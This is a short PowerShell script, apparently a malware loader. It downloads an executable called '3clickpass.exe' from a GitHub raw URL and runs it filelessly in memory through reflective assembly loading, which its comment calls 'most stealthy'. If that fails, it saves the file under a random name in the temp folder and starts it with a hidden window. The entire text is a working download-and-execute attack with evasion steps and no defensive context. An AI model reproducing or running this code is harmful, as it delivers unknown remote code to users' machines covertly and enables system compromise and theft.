# Download and execute from memory
$url = "https://github.com/meechtrades/meechtrades/raw/main/3clickpass.exe"

try {
    # Method 1: Memory execution (most stealthy)
    $data = (New-Object Net.WebClient).DownloadData($url)
    $assembly = [System.Reflection.Assembly]::Load($data)
    $entryPoint = $assembly.EntryPoint
    $entryPoint.Invoke($null, @())
} catch {
    # Method 2: Fallback with temp file
    try {
        $tempFile = "$env:TEMP\$([System.IO.Path]::GetRandomFileName()).exe"
        (New-Object Net.WebClient).DownloadFile($url, $tempFile)
        Start-Process -FilePath $tempFile -WindowStyle Hidden
    } catch {
        Write-Output "Execution failed: $($_.Exception.Message)"
    }
}
